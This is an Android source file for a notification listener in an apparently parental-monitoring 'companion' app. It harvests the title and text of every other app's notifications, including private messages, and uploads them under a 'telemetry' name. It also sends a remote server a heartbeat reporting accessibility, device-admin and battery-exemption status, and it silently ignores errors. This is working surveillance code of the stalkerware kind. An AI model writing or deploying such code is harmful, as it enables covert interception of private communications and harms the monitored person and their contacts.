package com.snapapp.companion;

import android.app.Notification;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

public class SnapNotificationListener extends NotificationListenerService {

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (sbn == null || sbn.getNotification() == null) return;
        if (!TelemetrySyncHelper.isFeatureEnabled(this, "notifications")) return;

        String pkg = sbn.getPackageName();
        if (pkg == null || pkg.equals(getPackageName()) || pkg.equals("android") || pkg.equals("com.android.systemui")) {
            return;
        }

        Notification n = sbn.getNotification();
        Bundle extras = n.extras;
        if (extras == null) return;

        CharSequence titleChar = extras.getCharSequence(Notification.EXTRA_TITLE);
        CharSequence textChar = extras.getCharSequence(Notification.EXTRA_TEXT);
        if (titleChar == null && textChar == null) return;

        String title = titleChar != null ? titleChar.toString() : "";
        String text = textChar != null ? textChar.toString() : "";

        // Skip empty or trivial notifications
        if (title.trim().isEmpty() && text.trim().isEmpty()) return;

        String appName = getAppName(pkg);
        long postTime = sbn.getPostTime();

        TelemetrySyncHelper.uploadNotification(this, pkg, appName, title, text, postTime);
    }

    private static volatile SnapNotificationListener sInstance;

    public static void fetchAndUploadActive(Context context) {
        if (sInstance == null) return;
        try {
            StatusBarNotification[] active = sInstance.getActiveNotifications();
            if (active != null) {
                for (StatusBarNotification sbn : active) {
                    sInstance.onNotificationPosted(sbn);
                }
            }
        } catch (Throwable ignored) {}
    }

    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
        sInstance = this;
        getSharedPreferences("snap_companion_prefs", MODE_PRIVATE).edit().putBoolean("is_notification_listener_active", true).apply();
        try {
            SharedPreferences prefs = getSharedPreferences("snap_companion_prefs", MODE_PRIVATE);
            String server = prefs.getString("server_url", "https://snap-app-chi.vercel.app");
            String devId = prefs.getString("device_id", null);
            if (devId != null) {
                ApiClient.sendHeartbeat(server, devId, 100, false, ParentalSetupHelper.isAccessibilityEnabled(this), ParentalSetupHelper.isDeviceAdminActive(this), ParentalSetupHelper.isBatteryOptimizationIgnored(this), null, null);
            }
        } catch (Throwable ignored) {}
    }

    @Override
    public void onListenerDisconnected() {
        super.onListenerDisconnected();
        sInstance = null;
        getSharedPreferences("snap_companion_prefs", MODE_PRIVATE).edit().putBoolean("is_notification_listener_active", false).apply();
    }

    private String getAppName(String pkg) {
        try {
            PackageManager pm = getPackageManager();
            ApplicationInfo info = pm.getApplicationInfo(pkg, 0);
            CharSequence label = pm.getApplicationLabel(info);
            return label != null ? label.toString() : pkg;
        } catch (Throwable e) {
            return pkg;
        }
    }
}
